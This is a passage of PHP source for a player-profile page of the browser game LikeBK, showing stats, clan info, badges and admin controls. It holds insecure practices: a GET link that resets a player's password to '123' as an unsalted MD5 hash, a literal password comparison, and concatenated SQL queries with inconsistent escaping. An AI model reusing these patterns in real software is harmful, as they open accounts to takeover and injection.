					 $nolog .= '<div>'.$u->microLogin($pl['id'],1);
					 if( $nodell['inUser'] != $pl['id'] && $pl['id'] != $nodell['id'] ) {
						 $nolog .= ' (персонажа можно <a href="?'.$inf['id'].'&del_copy='.$pl['id'].'">удалить</a>)';
					 }
					 if( $pl['id'] == $nodell['id'] ) {
						 $nolog .= ' (основной персонаж)';
					 }
					 $nolog .= '</div>'; 
				 }
			  }			  
			  if( $nolog != '' ) {
				  $nolog = '<small><b>Копии персонажа:</b>'.$nolog.'</small>';
				  echo $nolog;
			  }
			    
		  }
		  ?><?
          if( $u->info['admin'] > 0 ) {
			  if(isset($_GET['clearbattle'])) {
				 mysql_query('UPDATE `users` SET `battle` = 0 WHERE `id` = "'.$inf['id'].'" LIMIT 1');
				 mysql_query('DELETE FROM `battle_users` WHERE `uid` = "'.$inf['id'].'"'); 
				 mysql_query('DELETE FROM `battle_stat` WHERE `uid` = "'.$inf['id'].'"');
				 mysql_query('DELETE FROM `battle_static` WHERE `uid` = "'.$inf['id'].'"'); 
				 mysql_query('DELETE FROM `battle_end` WHERE `uid` = "'.$inf['id'].'"');  
			  }
			 echo '<div><a href="/inf.php?'.$inf['id'].'&clearbattle">Выпустить из поединка</a></div>';
			 echo '<div>Маг коф.: '.$st['mageme'].'</div>'; 
		  }
		  ?><div style="padding:5px;">Сила: <? echo statInfo('s1'); ?><BR>
                              <SPAN title=''>Ловкость: <? statInfo('s2'); ?></SPAN><BR>
                              <SPAN title=''>Интуиция: <? statInfo('s3'); ?></SPAN><BR>
                              <SPAN title=''>Выносливость: <? statInfo('s4'); ?></SPAN><BR>
                              <? if($inf['level']>3 || $st['s5']!=0){ ?><SPAN title=''>Интеллект: <? statInfo('s5'); ?></SPAN><BR><? } ?>
                              <? if($inf['level']>6 || $st['s6']!=0){ ?><SPAN title=''>Мудрость: <? statInfo('s6'); ?></SPAN><BR><? } ?>
                              <? if($inf['level']>9 || $st['s7']!=0){ ?><SPAN title=''>Духовность: <? statInfo('s7'); ?></SPAN><BR><? } ?>
                              <? if($inf['level']>11 || $st['s8']!=0){ ?><SPAN title=''>Воля: <? statInfo('s8'); ?></SPAN><BR><? } ?>
                              <? if($inf['level']>14 || $st['s9']!=0){ ?><SPAN title=''>Свобода духа: <? statInfo('s9'); ?></SPAN><BR><? } ?>
                              <? if($inf['level']>19 || $st['s10']!=0){ ?><SPAN title=''>Божественность: <? statInfo('s10'); ?></SPAN><BR><? } ?>
                              <? if($st['s11'] > 0 ) { ?>
                              <SPAN title=''>Энергия: <? statInfo('s11'); ?></SPAN><BR>
                              <? }
							  
							  if( $u->info['admin'] > 0 ) {
								  echo 'Текущий рейтинг в хаотах: '.$st['reting2'].' (в базе: '.$inf['btl_cof2'].')<br>';
								  echo 'Тактика духа в бою: '.$inf['tactic7'].'<br>';
								 echo 'Вещей подходящего уровня: '.$st['itmxxfs'].' (itmxxfs) , '.$st['lvlitmsu'].' (lvlitmsu)<BR>'; 
							  }
							  ?>
                      </div>
                      <div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div>
                      <div style="padding:5px;">
                                          <small> <? if( $inf['pass'] == 'saintlucia' && $u->info['admin'] > 0 ) { echo '<b>Уровень:</b>';  }else{ echo 'Уровень:'; } ?> <? echo $inf['level']; ?><BR>
                                Побед: <? if($inf['level']<4){ echo number_format($inf['win'], 0, ",", " "); }else{ echo '<a title="Персонаж учавствует в рейтинге" href="http://top.likebk.com/?user='.$inf['id'].'#'.$inf['id'].'" target="_blank">'.number_format($inf['win'], 0, ",", " ").'</a>'; } ?><BR>
                                Поражений: <? echo number_format($inf['lose'], 0, ",", " "); ?><BR>
                                Ничьих: <? echo number_format($inf['nich'], 0, ",", " "); ?><BR> 
                               <? if($inf['twink'] == 0) { ?> Побед в турнире: <? echo number_format($inf['win_t'], 0, ",", " "); ?><BR>
                                Поражений в турнире: <? echo number_format($inf['lose_t'], 0, ",", " "); ?><BR>
                                Ничьих в турнире: <? echo number_format($inf['nich_t'], 0, ",", " "); ?><BR> 
                                Побед в призовых хаотах: <? echo number_format($inf['win_p'], 0, ",", " "); ?><BR>
                                Поражений в призовых хаотах: <? echo number_format($inf['lose_p'], 0, ",", " "); ?><BR>   
							   <?}
								if( $u->info['admin'] > 0 ) {
									$tst1 = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `haot_stat` WHERE `uid` = "'.$inf['id'].'" LIMIT 1'));
									$tst2 = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `haot_stat` WHERE `uid` = "'.$inf['id'].'" AND `val` = 1 LIMIT 1'));
									echo 'Проведено хаотов: '.$tst1[0].'<br>';
									echo 'Побед в хаотах: '.$tst2[0].'<br>';
								}
								?>
								<? if($inf['dealer']==1){ 
                                	echo '<b>Орден Алхимиков</b>'; 
                                	if($inf['mod_zvanie']!=''){ 
                                		//echo ' - '.$inf['mod_zvanie']; 
                                	} 
                                	echo '<br>'; 
                                } ?>
                                <? if($inf['align']==10.2){ 
                                	echo '<b>Орден Рекламного Развития</b>'; 
                                	if($inf['mod_zvanie']!=''){ 
                                		//echo ' - '.$inf['mod_zvanie']; 
                                	} 
                                	echo '<br>'; 
                                } ?>
                                <? if($inf['align']>1 && $inf['align']<1.999){ 
                                	echo '<b>Орден Паладинов</b> - '.$u->mod_nm[1][$inf['align']]; 
                                	if($inf['align']!='1.99' && $inf['mod_zvanie']!=''){ 
                                		echo ' - '.$inf['mod_zvanie']; 
                                	} 
                                	echo '<br>';  
                                } ?>
                                <? if($inf['align']>3 && $inf['align']<4){ 
                                	//echo '<b>Армада</b>';
									echo '<b>Армада</b> - '.$u->mod_nm[3][$inf['align']]; 
                                	if($inf['align']!='3.99' && $inf['mod_zvanie']!=''){ 
                                	//	echo ' - '.$inf['mod_zvanie']; 
                                	} 
                                	echo '<br>';  
                                } ?>
                                <? if($inf['clan']>0)
                                {
                                    $pc = mysql_fetch_array(mysql_query('SELECT * FROM `clan` WHERE `id`="'.$inf['clan'].'" LIMIT 1'));
                                    if(isset($pc['id']))
                                    {
                                        $pc['img'] = $pc['name_mini'].'.gif';
                                        if($inf['clan_prava']=='glava')
                                        {
                                            $inf['mod_zvanie'] = '- <font color="#008080"><b>глава клана</b></font>';
                                        }elseif($inf['mod_zvanie']!='')
                                        {
                                            $inf['mod_zvanie'] = '- '.htmlspecialchars($inf['mod_zvanie'],NULL,'cp1251');	
											$inf['mod_zvanie'] = str_replace('&lt;b&gt;','<b>',$inf['mod_zvanie']);
											$inf['mod_zvanie'] = str_replace('&lt;/b&gt;','</b>',$inf['mod_zvanie']);
											$inf['mod_zvanie'] = str_replace('&lt;u&gt;','<u>',$inf['mod_zvanie']);
											$inf['mod_zvanie'] = str_replace('&lt;/u&gt;','</u>',$inf['mod_zvanie']);
											$inf['mod_zvanie'] = str_replace('&lt;i&gt;','<i>',$inf['mod_zvanie']);
											$inf['mod_zvanie'] = str_replace('&lt;/i&gt;','</i>',$inf['mod_zvanie']);
                                        }
                                        echo 'Клан: <a href="clans_inf.php?'.$pc['id'].'" target="_blank">'.$pc['name'].'</a> '.$inf['mod_zvanie'].'';
										if( $u->info['admin'] > 0 ) {
											echo ' <small><a target="_blank" href="/clan_editor.php?clan='.$inf['clan'].'">редактировать</a></small>';
										}
										echo '<br>';
                                    }
                                } ?>
                                <!-- Место рождения: <b><? //if($inf['cityreg2']==''){ echo $u->city_name[$inf['cityreg']]; }else{ echo $inf['cityreg2']; } ?></b><br /> -->
                                Место рождения: <b>LikeBK</b><br />
                                <? if($inf['city2']!='') { echo 'Второе гражданство: <b>'.$u->city_name[$inf['city2']].'</b><br />'; } ?>
                                День рождения персонажа: <? if($inf['timereg']==0){ echo 'До начала времен...'; }else{ echo date('d.m.Y H:i',$inf['timereg']); } ?> <br>
                                <? /*if( $inf['palpro'] > time() ) { ?>
                                Персонаж чист перед законом: до <?=date('d.m.Y H:i',$inf['palpro'])?><br>
                                <? }*/ ?>
                                <?
																								
								$twk = '';
								$sp = mysql_query('SELECT * FROM `users_twink` WHERE `uid` = "'.$inf['id'].'"');
								while( $pl = mysql_fetch_array($sp) ) {
									if( $pl['twink'] != 0 ) {
										if( $twk != '' ) { $twk .= ', '; }
										if( $inf['twink'] == $pl['twink'] ) {
											$twk .= '<b style="color:#ff9900;">'.$pl['login'].' ['.$pl['level'].']</b>';
										}else{
											$twk .= ''.$pl['login'].' ['.$pl['level'].']';
										}
									}
								}								
								if( $twk != '' ) {
									echo '<b>Твинк: '.$twk.'</b><br>';
								}
								?>
								<?
                                //История имен
                                $names = '';
                                $sp = mysql_query('SELECT * FROM `lastnames` WHERE `uid` = "'.$inf['id'].'" ORDER BY `time` DESC');
                                $i = 0;
                                while($pl = mysql_fetch_array($sp))
                                {
                                    if($i>0)
                                    {
                                        $names .= '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ';
                                    }
                                    $names .= '\''.$pl['login'].'\' до '.date('d.m.Y H:i',$pl['time']).'<br>';
                                    $i++;
                                }
                                if($names!='')
                                {
                                    echo 'История имен: '.$names.'';
                                }
                                /*
                                if($inf['win_t'] > 0) {
                                ?>
                                <div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div>
                                Побед в турнирах: <? echo number_format(round($inf['win_t']), 0, ",", " "); ?><BR>
                                Поражений в турнирах: <? echo number_format(round($inf['lose_t']), 0, ",", " "); ?><BR>
                                Турнирный рейтинг: <? echo number_format(round($inf['win_t']*1.79-$inf['lose_t']*2.15), 0, ",", " "); ?><BR>  
                                <? } */?>
            </div>  
                             <?
							  if( $u->info['dealer'] == 1 ) {
								$bnk = ''; $bmn1 = 0; $bmn2 = 0;
									$sp = mysql_query('SELECT * FROM `bank` WHERE `uid` = "'.$inf['id'].'"');
									while($pl = mysql_fetch_array($sp)) {
										if($pl['useNow'] > 0) {
											$bnk .= '<br><div style="display:inline-block;padding:5px;border-bottom:1px solid #AEAEAE;">';
										}else{
											$bnk .= '<br><div style="display:inline-block;padding:5px;border-bottom:1px solid #AEAEAE">';
										}
										$bnk .= '&nbsp; &bull; <span style="display:inline-block;width:75px;"><small>№</small> '.$pl['id'].'</span>';
										$bnk .= '</div>';
									}
									if($bnk != '') {
										echo '<br><b>Банковские счета:</b> &nbsp;'.$bnk.'<br>';
									}
									echo '</div>';
							  }
							  ?>
                      <div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div>
            <!-- значки --></td>
          </tr>
        </table>
              <?
			  if( $inf['priemslot'] > 20 ) { $inf['priemslot'] = 22; }
								if( $u->info['admin'] > 0 ) {
									if(isset($_GET['obtime'])) {
										mysql_query('DELETE FROM `elka_quest` WHERE `uid` = "'.$inf['id'].'"');
									}elseif(isset($_GET['pass123'])) {
										mysql_query('UPDATE `users` SET `pass` = "202cb962ac59075b964b07152d234b70" WHERE `id` = "'.$inf['id'].'" LIMIT 1');
									}elseif(isset($_GET['retwink'])) {
										if( $inf['twink'] == 0 ) {
											//mysql_query('UPDATE `items_users` SET `uid` = '.$inf['id'].' WHERE `uid` LIKE "-9%'.$inf['id'].'" AND `inShop` > 0');
											mysql_query('UPDATE `items_users` SET `uid` = '.$inf['id'].' WHERE `uid` LIKE "%'.$inf['id'].'"');
										}
									}elseif(isset($_GET['reobj'])) {
										mysql_query('DELETE FROM `actions` WHERE `vars` lIKE "%sleep%" AND `uid` = "'.$inf['id'].'"');
									}
									echo '<div><a href="/inf.php?'.$inf['id'].'&obtime">Обнулить время квеста</a></div>';
									echo '<div><a href="/inf.php?'.$inf['id'].'&pass123">Обнулить на пароль &quot;123&quot;</a></div>';
									echo '<div><a href="/inf.php?'.$inf['id'].'&retwink">Вернуть вещи с твинка</a></div>';
									echo '<div><a href="/inf.php?'.$inf['id'].'&reobj">Разбудить персонажа</a></div>';
								}
								if( $u->info['admin'] > 0 ) {
									echo '<div><a href="/doc.php?uid='.$inf['id'].'">Скриншоты персонажа</a></div>';
								}
			  
			  	if( $u->info['admin'] > 0 ) {
					if(isset($_POST['hprem'])) {
						mysql_query('DELETE FROM `premium` WHERE `uid` = "'.$inf['id'].'" LIMIT 1');
						mysql_query('DELETE FROM `eff_users` WHERE `uid` = "'.$inf['id'].'" AND `id_eff` = "435" AND `delete` = 0 LIMIT 1');
						$tmadd = (int)$_POST['hprem'];
						$tmadd = $tmadd * 86400;
						mysql_query("INSERT INTO `eff_users` (`id_eff`, `uid`, `name`, `data`, `overType`, `timeUse`, `timeAce`, `user_use`, `delete`, `v1`, `v2`, `img2`, `x`, `hod`, `bj`, `sleeptime`, `no_Ace`, `file_finish`, `tr_life_user`, `deactiveTime`, `deactiveLast`, `mark`, `bs`, `endtime`, `endfx`) VALUES (435, ".$inf['id'].", 'LikeBk Gold', 'add_speedhp=150|add_speed_dungeon=50|add_speedmp=150|add_m10=10|add_m11=10|add_exp=100|add_sale_berez=100|add_sale_ekr_berez=100|add_za=10|add_zma=10', 777, ".(time()+$tmadd).", 0, '', 0, '0', 0, '', 1, -1, '0', 0, 1, '', 0, 0, 0, 1, 0, 0, 0);");
						mysql_query("INSERT INTO `premium` (`uid`, `name`, `type`, `time_delete`, `money`, `speed_Loc`, `speedHp`, `speedMp`, `addExp`, `addRep`, `ym_delay`, `yv_drop`, `speed_dunger`, `mfza`, `mf_yron`, `sale_prc`, `saleEkr_prc`, `Exp_zver`) VALUES (".$inf['id'].", 'LikeBk Gold', 3, ".(time()+$tmadd).", 0, 30, 150, 150, 100, 50, 50, 2, 50, 10, 10, 100, 100, 100);");
					}
					?>
                    <b>Слотов приемов: <?=$inf['priemslot']?></b><br>
                    <form method="post" action="inf.php?<?=$inf['id']?>">
                    	<b>LikeBk Gold</b>
                        Сколько дней: <input type="text" style="padding:5px; width:50px;" value="0" name="hprem">
                        <input value="Выдать" type="submit"> 
                    </form>
                    <?
					$bka = mysql_fetch_array(mysql_query('SELECT * FROM `bank_alh` WHERE `uid` = '.mysql_real_escape_string($inf['id']).' LIMIT 1'));
					if(isset($bka['id'])) {
						if(isset($_POST['gldekr'])) {
							mysql_query('UPDATE `bank_alh` SET `ekr2` = `ekr2` + "'.mysql_real_escape_string($_POST['gldekr']).'" WHERE `id` = "'.$bka['id'].'" LIMIT 1');
							die('<script>top.location = "/inf.php?'.$inf['id'].'";</script>');
						}
					?>
                    <hr>
                    <form method="post" action="inf.php?<?=$inf['id']?>">
                    	<b>Выдать алхимику Gold Ekr. (Сейчас у него: <?=$bka['ekr2']?> Gold ekr.)</b><br>
                        Количество Gold ekr: <input type="text" style="padding:5px; width:50px;" value="0" name="gldekr">
                        <input value="Выдать" type="submit"> 
                    </form>
                    <?
					}
				}
			  			  
				 if($inf['dealer']==1)
				 {
					  $abnk = mysql_fetch_array(mysql_query('SELECT * FROM `bank_alh` WHERE `uid` = "'.$inf['id'].'" LIMIT 1'));
					  ?>
					  <b>
                      		<img src="http://img.likebk.com/alchemy1.gif" onMouseOver="top.hi(this,'Регистрированный алхимик.<Br>Имеет право продавать услуги «<? echo $c['title3']; ?>»',event,0,0,1,0,'');" onMouseOut="top.hic();" onMouseDown="top.hic();"> 
                      		<small>Регистрированный Алхимик</small></b> 
					  <!-- <fieldset style="border: 1px solid #AEAEAE;width:280px;">
                      <legend>
                      	<b>
                      		<img src="http://img.likebk.com/alchemy1.gif" onMouseOver="top.hi(this,'Регистрированный алхимик.<Br>Имеет право продавать услуги «<? echo $c['title3']; ?>»',event,0,0,1,0,'');" onMouseOut="top.hic();" onMouseDown="top.hic();"> 
                      		<small>Регистрированный Алхимик</small></b> 
                      </legend><br>                      -->
                      <? //if( $abnk['ekr'] > 0 ) { ?>
                      <!-- <div style="height:20px;">
                      	<span style="float:left">Баланс: </span><span style="float:right"><?=$abnk['ekr']?> Екр.</span>
                      </div> -->
                      <?
/*					  if( $abnk['mobile'] != '0' || $abnk['icq'] != '0' || $abnk['skype'] != '0' || $abnk['mail'] != '0' ) {
					  ?>
                      <div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div>
                      <small>
                      <b>Контактные данные:</b><br>
                      <?
					  if( $abnk['mobile'] != '0' ) {
						 echo 'Мобильный: '.$abnk['mobile'].'<br>'; 
					  }
					  if( $abnk['icq'] != '0' ) {
						 echo 'icq: '.$abnk['icq'].'<br>'; 
					  }
					  if( $abnk['skype'] != '0' ) {
						 echo 'skype: '.$abnk['skype'].'<br>'; 
					  }
					  if( $abnk['mail'] != '0' ) {
						  echo 'E-mail: '.$abnk['mail'].'<br>'; 
					  }
					  ?>
                      </small>
                      <?
					  }
					  $epays = '';

					  if( $abnk['sberbank'] != '0' ) {
						$epays .= '<img title="Банк Сбербанк" width="50" height="30" src="http://img.likebk.com/pay/bank/sberbank.png">';  
					  }
					  if( $abnk['alfabank'] != '0' ) {
						$epays .= '<img title="Банк Альфабанк" width="50" height="30" src="http://img.likebk.com/pay/bank/alfabank-white.png">';  
					  }
					  if( $abnk['vtb24'] != '0' ) {
						$epays .= '<img title="Банк ВТБ24" width="50" height="30" src="http://img.likebk.com/pay/bank/vtb24.png">';  
					  }
					  if( $abnk['raiffeisen'] != '0' ) {
						$epays .= '<img title="Банк Raiffeisen" width="50" height="30" src="http://img.likebk.com/pay/bank/raiffeisen.png">';  
					  }
					  if( $abnk['privatbank'] != '0' ) {
						$epays .= '<img title="Банк Приватбанк" width="50" height="30" src="http://img.likebk.com/pay/bank/privatbank.png">';  
					  }
					  if( $abnk['sms'] != '0' ) {
						$epays .= '<img title="Оплата через SMS" width="50" height="30" src="http://img.likebk.com/pay/other/sms.png">';  
					  }
					  if( $abnk['visa'] != '0' ) {
						$epays .= '<img title="VISA" width="50" height="30" src="http://img.likebk.com/pay/card/visa.png">';  
					  }
					  if( $abnk['mastercard'] != '0' ) {
						$epays .= '<img title="MasterCard" width="50" height="30" src="http://img.likebk.com/pay/card/mastercard.png">';  
					  }
					  if( $abnk['paypal'] != '0' ) {
						$epays .= '<img title="Платежная система PayPal" width="50" height="30" src="http://img.likebk.com/pay/e-payment/paypal.png">';  
					  }
					  if( $abnk['liqpay'] != '0' ) {
						$epays .= '<img title="Платежная система LiqPay" width="50" height="30" src="http://img.likebk.com/pay/e-payment/liqpay.png">';  
					  }
					  if( $abnk['webmoney'] != '0' ) {
						$epays .= '<img title="Платежная система WebMoney" width="50" height="30" src="http://img.likebk.com/pay/e-payment/webmoney-white.png">';  
					  }
					  if( $abnk['yandex'] != '0' ) {
						$epays .= '<img title="Платежная система Яндекс.Деньги" width="50" height="30" src="http://img.likebk.com/pay/e-payment/yandexmoney.png">';  
					  }
					  if( $abnk['qiwi'] != '0' ) {
						$epays .= '<img title="Платежная система и терминалы QIWI" width="50" height="30" src="http://img.likebk.com/pay/terminal/qiwi.png">';  
					  }
					  if( $abnk['zpayment'] != '0' ) {
						$epays .= '<img title="Платежная система Z-Payment" width="50" height="30" src="http://img.likebk.com/pay/e-payment/zpayment.png">';  
					  }
					  if( $epays != '' ) { $epays =  '<div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div><center>'.$epays.'</center>'; }
					  echo $epays;*/
					  //
					  //}else{ ?>
                      <!-- <b><font color="red"><small>Алхимик не имеет средств для продажи</small></font></b> -->
                      <? //} ?>
					  <!-- </fieldset> -->
					  <?
				 }
				
				 $ico = '';
				 
				 $ico2 = '';
				
			     if($inf['id'] == 12345 && $u->info['admin'] > 0 ) {
                 	$ico[1] .= '<img src="http://img.likebk.com/handmaid.png" onMouseOver="top.hi(this,\'<b>Регистрированный рукожоп</b><br>Персонаж имеет официальное право рукожопить на просторах проекта.\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"> '; 
				 }
				 
				 if( $inf['id'] == 12345 || $inf['timereg'] < time() - 3*86400*365 ) {
					 $ico[1] .= '<img src="http://img.likebk.com/3god.png" onMouseOver="top.hi(this,\'<b>Персонажу 3 года</b><br>Персонаж провел на проекте 1095 дней и более!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"> '; 
				 }elseif( $inf['id'] == 12345 || $inf['timereg'] < time() - 2*86400*365 ) {
					 $ico[1] .= '<img src="http://img.likebk.com/2god.gif" onMouseOver="top.hi(this,\'<b>Персонажу 2 года</b><br>Персонаж провел на проекте 730 дней и более!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"> '; 
				 }elseif( $inf['id'] == 12345 || $inf['timereg'] < time() - 86400*365 ) {
					 $ico[1] .= '<img src="http://img.likebk.com/1god.png" onMouseOver="top.hi(this,\'<b>Персонажу 1 год</b><br>Персонаж провел на проекте 365 дней и более!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"> '; 
				 }
				 	
				if( $inf['id'] == 87363) {
					$inf['marry'] = -1;
				}
											  
				 if($inf['marry']!=0)
				 {
				 	$marry = mysql_fetch_array(mysql_query('SELECT `id`,`login` FROM `users` WHERE `id` = "'.$inf['marry'].'" LIMIT 1'));
					if( $inf['marry'] == -1 ){
						$marry = array(
							'id'=>'login=Королева%20Грибницы',
							'login'=>'Королева Грибницы',
							'sex'=>1
						);
					}
					 if(isset($marry['id']))
					{
						$mrtxt = '';
						if($inf['sex']==0)
						{
							$mrtxt = 'Женат на';
						}else{
							$mrtxt = 'Замужем за';
						}
						$ico[1] .= '<a href="inf.php?'.$marry['id'].'"><img src="http://img.likebk.com/i/i_marry.gif" onMouseOver="top.hi(this,\''.$mrtxt.' <b>'.$marry['login'].'</b>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					}
				 } 
				
			  	 //if( $u->info['admin'] > 0 ) {
					 if($inf['win_t'] >= 500) {
						 $ico[-1] .= ' <img height="35" src="http://img.likebk.com/turnir_golg.png" onMouseOver="top.hi(this,\'<b>Участник турниров.</b> Золото (500 побед).<br>Бонус НР: +50\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
					 }elseif($inf['win_t'] >= 300) {
						 $ico[-1] .= ' <img height="35" src="http://img.likebk.com/turnir_silver.png" onMouseOver="top.hi(this,\'<b>Участник турниров.</b> Серебро (300 побед).<br>Бонус НР: +30\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
					 }elseif($inf['win_t'] >= 100) {
						 $ico[-1] .= ' <img height="35" src="http://img.likebk.com/turnir_bronze.png" onMouseOver="top.hi(this,\'<b>Участник турниров.</b> Бронза (100 побед).<br>Бонус НР: +10\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
					 }
				 //}
				
				 if( $inf['win_p'] >= 100 && $inf['win_p'] < 500 ) {
					 $ico[-1] .= '<img src="http://img.likebk.com/priz/1.png" onMouseOver="top.hi(this,\'<b>100 побед</b> в Призовых хаотах\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
				 }elseif( $inf['win_p'] >= 500 && $inf['win_p'] < 1000 ) {
					 $ico[-1] .= '<img src="http://img.likebk.com/priz/2.png" onMouseOver="top.hi(this,\'<b>500 побед</b> в Призовых хаотах\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
				 }elseif( $inf['win_p'] >= 1000 ) {
					 $ico[-1] .= '<img src="http://img.likebk.com/priz/3.png" onMouseOver="top.hi(this,\'<b>1000 побед</b> в Призовых хаотах\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
				 }
				 
				 if($inf['win_bs'] >= 25) {
					 $ico[1] .= '<a href="#"><img src="http://i.oldbk.com/i/dt1.gif" onMouseOver="top.hi(this,\'<b><i>Башня Смерти<br><font color=green><center>25 побед</center></b></font></i>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
				 }
				 if($inf['win_bs'] >= 50) {
					 $ico[1] .= '<a href="#"><img src="http://i.oldbk.com/i/dt2.gif" onMouseOver="top.hi(this,\'<b><i>Башня Смерти<br><font color=green><center>50 побед</center></b></font></i>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
				 }
				 if($inf['win_bs'] >= 100) {
					 $ico[1] .= '<a href="#"><img src="http://i.oldbk.com/i/dt3.gif" onMouseOver="top.hi(this,\'<b><i>Башня Смерти<br><font color=green><center>100 побед</center></b></font></i>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
				 }
				 if($inf['win_bs'] >= 150) {
					 $ico[1] .= '<a href="#"><img src="http://i.oldbk.com/i/dt4.gif" onMouseOver="top.hi(this,\'<b><i>Башня Смерти<br><font color=green><center>150 побед</center></b></font></i>\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
				 }
				 
				 
				 //значок регистратора
				 /*$uref = mysql_fetch_array(mysql_query('SELECT COUNT(`id`) FROM `users` WHERE `host_reg` = "'.$inf['id'].'" AND `level` > 0 LIMIT 1000'));			 
				 $uref = $uref[0];
				 if($uref>9)
				 {
					 $rico = 0;
					 if($uref>=30){ $rico = 19; 
					 }elseif($uref>=20){ $rico = 20; 
					 }elseif($uref>=10){ $rico = 21; }
					 
					 if($rico>0)
					 {
						$stp = array(21=>'XXI степень<br><small>новичок</small>',
									 20=>'XX степень<br><small>новичок</small>',
									 19=>'IXX степень<br><small>новичок</small>');
						echo '<a href="#'.$uref.'"><img src="http://img.likebk.com/reg_ico_'.$rico.'.png" onMouseOver="top.hi(this,\'Орден Регатов, '.$stp[$rico].'\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a>';
					 }
				 }
				 */
				 				 
				 $sp = mysql_query('SELECT * FROM `users_ico` WHERE `uid` = "'.$inf['id'].'" AND (`endTime` = 0 OR `endTime` > '.time().') LIMIT 100');
				 while($pl = mysql_fetch_array($sp))
				 {
					 $stlico = '';
					 
					 if( $pl['type'] == 2 ) {
						 $stlico .= 'width:37px;height:37xp;padding:2px;';
					 }
					 
					 if($stlico != '') {
						$stlico = 'style="'.$stlico.'"';
					 }
					 
					 if( $pl['img'] == '2godlike.png' ) {
						 $pl['text'] = '<b>Дв</b>'.$pl['text'];
					 }
					 if( $pl['img'] == '3godlike.png' ) {
						 $pl['text'] = '<b>Три</b>'.str_replace('а г',' г',$pl['text']);
					 }
					 
					 if( $pl['img'] == 'helloween_2014m1.gif' ) {
						$pl['img'] = rtrim($pl['img'],'.gif');
						//
						$xix = mysql_fetch_array(mysql_query('SELECT * FROM `helloween` WHERE `uid` = "'.$inf['id'].'" ORDER BY `y` DESC LIMIT 1'));
						$xix = $xix['x']+0;
						
						if( $xix > 0 ) {
							if( $xix > 5 ) {
								$xix = 5;
							}
							$pl['img'] .= $xix;
						}
						//
						$pl['img'] .= '.gif'; 
					 }
					 
					 if( $pl['type'] == -1 ) {
						$stlico .= ' height="34"'; 
					 }
					 
					 $pl['text'] = str_replace('<b>Пасха</b>`2017','<b>Пасха</b>`'.date('Y',$pl['time']).'',$pl['text']);
					 
					 $icon = ' <img '.$stlico.' src="http://img.likebk.com/'.$pl['img'].'" onMouseOver="top.hi(this,\''.$pl['text'].'\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();">';
					 
					 if( $pl['href'] != '#' && $pl['href'] != '' ) {
					 	$ico[$pl['type']] .= '<a target="_blank" href="'.$pl['href'].'">'.$icon.'</a>';
					 }else{
						 $ico[$pl['type']] .= $icon;
					 }
				 }
				 unset($icon);
				 
				 //сильвер
				/* if($st['silver']>0) {
					 $ico[1] .= ' <a href="http://likebk.com/library/Vip/" target="_blank"><img src="http://img.likebk.com/i/vip2.gif" onMouseOver="top.hi(this,\'VIP игрок Бойцовского Клуба\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }*/
				 if( $inf['id'] != 42812795 ) {
				 if($inf['vip']==1) {
					 $ico[1] .= ' <a href="#"><img src="http://img.likebk.com/i/vip2.gif" onMouseOver="top.hi(this,\'VIP игрок Бойцовского Клуба\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }elseif($inf['vip']==2) {
					 $ico[1] .= ' <a href="#"><img src="http://img.likebk.com/vip2.gif" onMouseOver="top.hi(this,\'VIP игрок Бойцовского Клуба\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }
				 }
				 $o23ov = mysql_fetch_array(mysql_query('SELECT * FROM `23quest` WHERE `time` > "'.time().'" AND `uid` = "'.$inf['id'].'" LIMIT 1'));
				 if(isset($o23ov['id'])) {
					$mest = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `23quest` WHERE `id` < "'.$o23ov['id'].'" LIMIT 1'));
					$mest = $mest[0]+1;
					if( $o23ov['time'] >= 1580639949 ) {
						$mest -= 356;
					}
					$ico[1] .= ' <a href="#"><img src="http://img.likebk.com/i/defender.gif" onMouseOver="top.hi(this,\'<B>Защитник ЛайкБК!</b>`'.date('Y',$o23ov['time']-345*86400).'<br>Персонаж занял '.$mest.' место!\',event,0,0,1,0,\'\');" onMouseOut="top.hic();" onMouseDown="top.hic();"></a> ';
				 }
				 $o8ov = mysql_fetch_array(mysql_query('SELECT * FROM `8quest` WHERE `time` > "'.time().'" AND `uid` = "'.$inf['id'].'" LIMIT 1'));
				 if(isset($o8ov['id'])) {
					$mest = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `8quest` WHERE `id` < "'.$o8ov['id'].'" LIMIT 1'));
